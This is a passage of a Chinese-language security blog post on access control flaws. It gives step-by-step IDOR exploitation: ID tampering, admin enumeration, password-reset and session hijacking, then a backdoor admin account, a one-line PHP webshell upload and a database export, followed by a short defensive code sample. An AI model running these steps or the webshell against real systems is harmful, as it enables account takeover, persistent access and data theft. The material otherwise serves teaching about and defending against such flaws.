+<h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><h5 id="发现IDOR漏洞"><a href="#发现IDOR漏洞" class="headerlink" title="发现IDOR漏洞"></a>发现IDOR漏洞</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">登录你的普通账户（如用户<span class="hljs-attribute">ID</span>=100）<br><br>用Burp Suite捕获查看个人资料的请求：<br>          <span class="hljs-built_in">GET</span> /profile?<span class="hljs-attribute">id</span>=100 HTTP/1.1<br>          Cookie: <span class="hljs-attribute">session</span>=your_cookie<br><br>修改ID值发送给其他用户（如<span class="hljs-attribute">ID</span>=101）：<br>       - <span class="hljs-built_in">GET</span> /profile?<span class="hljs-attribute">id</span>=100<br>       + <span class="hljs-built_in">GET</span> /profile?<span class="hljs-attribute">id</span>=101<br></code></pre></td></tr></table></figure>
+
+<p>如果返回他人资料 → ​<strong>存在水平越权！​</strong></p>
+<h5 id="寻找管理员账户"><a href="#寻找管理员账户" class="headerlink" title="寻找管理员账户"></a>寻找管理员账户</h5><p>方法</p>
+<p>–​ID递增扫描​</p>
+<p>用Burp Intruder批量测试ID范围（如1-1000）</p>
+<p>–​关键词搜索​</p>
+<p>在页面源码搜索 admin、root、superuser</p>
+<p>–​密码重置功能​</p>
+<p>尝试重置用户密码，观察返回邮箱后缀（如 <a href="mailto:&#97;&#x64;&#109;&#105;&#110;&#x40;&#x63;&#x6f;&#x6d;&#x70;&#97;&#x6e;&#x79;&#x2e;&#99;&#111;&#x6d;">admin@company.com</a>）</p>
+<p>​–员工名单泄露​</p>
+<p>检查 &#x2F;team.html、&#x2F;aboutus.html等页面</p>
+<h4 id="突破管理员账户"><a href="#突破管理员账户" class="headerlink" title="突破管理员账户"></a>突破管理员账户</h4><h5 id="方法1：窃取密码"><a href="#方法1：窃取密码" class="headerlink" title="方法1：窃取密码"></a>方法1：窃取密码</h5><ol>
+<li><p>访问管理员资料页：<code>/profile?id=admin_id</code></p>
+</li>
+<li><p>查找页面中的敏感信息：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 可能泄露的内容 --&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Admin123!&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span>admin@company.com<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;reset_password?token=7aF3...&quot;</span>&gt;</span>忘记密码?<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="方法2：篡改密码重置"><a href="#方法2：篡改密码重置" class="headerlink" title="方法2：篡改密码重置"></a>方法2：篡改密码重置</h5></li>
+</ol>
+<h5 id="捕获普通用户的重置请求"><a href="#捕获普通用户的重置请求" class="headerlink" title="捕获普通用户的重置请求"></a>捕获普通用户的重置请求</h5><ol start="3">
+<li>修改为管理员ID重放：</li>
+</ol>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">- <span class="hljs-attribute">user</span>=100<br>+ <span class="hljs-attribute">user</span>=admin_id<br></code></pre></td></tr></table></figure>
+
+<h5 id="方法3：会话劫持"><a href="#方法3：会话劫持" class="headerlink" title="方法3：会话劫持"></a>方法3：会话劫持</h5><ol>
+<li><p>在管理员资料页查找会话信息：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-comment">// 可能泄露的JS代码</span><br>var userS<span class="hljs-attr">ession</span> <span class="hljs-operator">=</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">   </span><br><span class="hljs-symbol">  id:</span> <span class="hljs-string">&quot;admin_id&quot;</span>,<br><span class="hljs-symbol">  token:</span> <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&quot;</span>,<br><span class="hljs-symbol">  role:</span> <span class="hljs-string">&quot;admin&quot;</span><br>   <br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>复制会话值 → 用浏览器插件（如EditThisCookie）替换自己的Cookie</p>
+</li>
+</ol>
+<h4 id="登录管理员账户"><a href="#登录管理员账户" class="headerlink" title="登录管理员账户"></a>登录管理员账户</h4><ul>
+<li><p>直接使用窃取的密码登录</p>
+</li>
+<li><p>或使用会话令牌访问：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/admin_dashboard</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=stolen_admin_token<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="执行垂直提权操作"><a href="#执行垂直提权操作" class="headerlink" title="执行垂直提权操作"></a>执行垂直提权操作</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>. 创建后门账户：<br>POST /admin/create_user HTTP/<span class="hljs-number">1.1</span>          username=backdoor&amp;password=hacked&amp;role=superadmin<br><span class="hljs-number">2</span>. 部署WebShell：   <br>POST /admin/upload HTTP/<span class="hljs-number">1.1</span>   file=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-number">3</span>. 窃取数据库：<br>GET /admin/export_db HTTP/<span class="hljs-number">1.1</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 安全代码示例：双重验证</span><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">accessProfile</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> userId</span>) &#123;<br>  <span class="hljs-comment">// 1. 从会话获取真实用户ID</span><br>  <span class="hljs-title class_">String</span> realUserId = <span class="hljs-title function_">getCurrentUser</span>(); <br><br>  <span class="hljs-comment">// 2. 验证请求者身份</span><br>  <span class="hljs-keyword">if</span> (!realUserId.<span class="hljs-title function_">equals</span>(userId)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AccessDeniedException</span>();<br>  &#125;<br><br>  <span class="hljs-comment">// 3. 敏感操作二次验证</span><br>  <span class="hljs-keyword">if</span> (action.<span class="hljs-title function_">equals</span>(<span class="hljs-string">&quot;resetPassword&quot;</span>)) &#123;<br>    <span class="hljs-title function_">require2FA</span>(); <span class="hljs-comment">// 强制双因素认证</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>访问控制漏洞</div>
+      <div>http://example.com/2025/09/27/访问控制漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>ziddzide</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年9月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/24/XSS%E6%BC%8F%E6%B4%9E/" title="XSS漏洞">
+                        <span class="hidden-mobile">XSS漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
